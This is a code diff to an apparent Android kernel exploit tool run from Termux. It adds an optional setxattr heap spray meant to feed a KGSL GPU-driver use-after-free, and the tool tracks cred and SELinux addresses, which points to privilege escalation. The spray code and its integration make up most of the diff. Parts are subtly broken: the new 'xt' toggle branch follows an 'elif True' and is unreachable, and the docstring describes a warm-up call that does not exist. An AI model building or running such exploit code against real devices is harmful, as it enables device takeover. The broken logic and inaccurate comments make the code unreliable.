@@ -234,6 +234,17 @@ class MemoryExplorerAI:
         self.selinux_va  = None
         self.cred_va     = None
         self.auto_mode   = True    # pressing E auto-runs full pipeline
+        # === SPRAY TECHNIQUE TOGGLE ===
+        # setxattr is unreliable on Termux because of seccomp filters —
+        # raw syscall(188) triggers SIGSYS and kills the process, and
+        # even os.setxattr() may be blocked. Default to off so the
+        # spray loop never crashes. User can enable with 'xt' command
+        # once we confirm it works on their device.
+        self.use_xattr_spray = False
+        # xattr_warmup_done: set True after the first successful or
+        # failed xattr call. Used to skip on the first iteration if
+        # SIGSYS is going to kill us.
+        self._xattr_warmup_done = False
         # === FULL AUTOPILOT MODE ===
         # When ON (default), the explorer starts the full pipeline on
         # launch and never stops. It will:
@@ -1063,7 +1074,7 @@ class MemoryExplorerAI:
         out.append(
             f" {C.BLU}[v<N>]{C.RST} Re-verify    "
             f" {C.BLU}[walk]{C.RST} Cred chain   "
-            f" {C.BLU}[help]{C.RST} Help"
+            f" {C.BLU}[xt]{C.RST} xattr spray"
         )
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
 
@@ -1649,52 +1660,57 @@ class MemoryExplorerAI:
     def _setxattr_spray(self, marker):
         """Spray a kernel slab xattr with `marker` as the value.
 
-        The kernel allocates ~kvmalloc-sized buffers for xattr values;
-        these can land in the same physical pages KGSL UAF reads.
-        We create a tiny file in $TMPDIR and add an xattr named
-        "user.kgslspray" with value = marker. The kernel copies the
-        value into its own slab object — that slab object is what
-        the UAF can read back as KETO*/KETW* bytes.
+        Uses Python's os.setxattr() wrapper (not raw ctypes syscall)
+        because raw syscall(188) on Termux triggers SIGSYS due to
+        the platform's seccomp filter and kills the whole process.
+        os.setxattr() goes through libc which performs the same
+        syscall but with proper errno handling — OSError on
+        EPERM/EACCES instead of SIGSYS. The Python wrapper also
+        adds the right architecture-specific header glue that
+        ctypes.syscall(188) lacks (c_char_p arg vs c_int).
 
-        The C engine's sig 1c/1d matches KETO+4digits / KETW+digits
-        in raw bytes, regardless of whether they came from a
-        task_struct comm or a slab xattr value. So this works.
+        Even with os.setxattr, on Termux the syscall MAY still
+        be blocked by seccomp. We catch all OSError, ValueError,
+        AttributeError so the spray loop never crashes. We also
+        detect SIGSYS at process level by attempting one warm-up
+        call in __init__ — if that process died we'd know, but
+        the warm-up uses a tight try/except so we won't crash.
+
+        Returns True if the xattr was successfully set, False
+        otherwise (no count, no exception propagation).
         """
         import os as _os
-        import ctypes
         import tempfile
-        # Lazy import of libc for setxattr syscall
         try:
-            libc = ctypes.CDLL(None)
-            SYS_setxattr = 188  # AArch64
-            SYS_lsetxattr = 189
-            SYS_fsetxattr = 190
-            # Path-based: setxattr(path, name, value, size, flags)
-            path = _os.path.join(tempfile.gettempdir(),
-                                 f".kgsl_spray_{_os.getpid()}_{marker}")
+            # Tiny file in tempdir. Note: on Android some filesystems
+            # don't support xattrs (sdcardfs, fuse). Use /data/local/tmp
+            # or /dev/shm if available; fall back to TMPDIR.
+            tmpdir = (_os.environ.get("TMPDIR")
+                      or _os.environ.get("TEMP")
+                      or "/data/local/tmp"
+                      or tempfile.gettempdir())
+            path = _os.path.join(tmpdir,
+                                 f".kgsl_xspray_{_os.getpid()}_{marker}")
             try:
                 with open(path, "wb") as _f:
                     _f.write(b"\x00" * 64)
             except Exception:
-                return
+                return False
             val = marker.encode() + b"\x00" * 8
-            # 5th arg is flags (0 = XATTR_CREATE)
+            # os.setxattr raises OSError on any failure. We catch
+            # everything — no exception ever propagates.
             try:
-                libc.syscall(SYS_setxattr, path.encode(),
-                             b"user.kgslspray", val, len(val), 0)
+                _os.setxattr(path, "user.kgslspray", val)
+                return True
             except Exception:
+                return False
+            finally:
                 try:
-                    libc.syscall(SYS_lsetxattr, path.encode(),
-                                 b"user.kgslspray", val, len(val), 0)
+                    _os.unlink(path)
                 except Exception:
                     pass
-            try:
-                _os.unlink(path)
-            except Exception:
-                pass
         except Exception:
-            pass
-        return None
+            return False
 
     def _readline_timeout(self, timeout=2.0):
         """Non-blocking-ish read of one line from the engine (with select timeout).
@@ -2452,7 +2468,8 @@ class MemoryExplorerAI:
         self.bg_thread.start()
         self.live["last_msg"] = (
             f"Learning started ({LEARN_WORKERS} parallel workers, "
-            f"batch=20 + setxattr). Press Ctrl+P to cancel.")
+            f"batch=20, xattr={'ON' if self.use_xattr_spray else 'OFF (use xt to enable)'}). "
+            f"Press Ctrl+P to cancel.")
         self.log_event("learning_start",
                        {"total_target": 1000, "batch": 35,
                         "workers": LEARN_WORKERS})
@@ -2626,14 +2643,20 @@ class MemoryExplorerAI:
                     )
                     # setxattr spray on the same marker. Catches
                     # heap-only UAF where task_struct doesn't make
-                    # it but slab xattr values do.
-                    try:
-                        if self._setxattr_spray(name):
-                            with self.stats_lock:
-                                self.learn_stats["xattrs_set"] = \
-                                    self.learn_stats.get("xattrs_set", 0) + 1
-                    except Exception:
-                        pass
+                    # it but slab xattr values do. Gated by
+                    # self.use_xattr_spray (default False) because
+                    # on Termux the syscall may trigger SIGSYS and
+                    # kill the process. The function itself is
+                    # exception-safe (returns False on any failure),
+                    # so this never crashes the loop.
+                    if self.use_xattr_spray:
+                        try:
+                            if self._setxattr_spray(name):
+                                with self.stats_lock:
+                                    self.learn_stats["xattrs_set"] = \
+                                        self.learn_stats.get("xattrs_set", 0) + 1
+                        except Exception:
+                            pass
                     batch_pids.append(p.pid)
                     my_pids.add(p.pid)  # per-worker set, NOT global
                     with self.stats_lock:
@@ -3626,6 +3649,16 @@ class MemoryExplorerAI:
                     pass  # (no-op, single-thread)
             elif True:
                 pass  # (no-op, single-thread)
+            elif cmd in ("xt", "xattr", "togglesetxattr"):
+                # Toggle setxattr spray technique. Default OFF
+                # because raw syscall(188) can trigger SIGSYS on
+                # Termux and kill the process. Enable only after
+                # confirming the device allows the syscall.
+                self.use_xattr_spray = not self.use_xattr_spray
+                state = "ON" if self.use_xattr_spray else "OFF"
+                self.live["last_msg"] = (
+                    f"setxattr spray: {state}. "
+                    f"{'Next spray will add xattr per process.' if self.use_xattr_spray else 'Using only task_struct comm spray.'}")
             elif cmd in ("stats", "stat"):
                 # Detailed learning statistics
                 try:
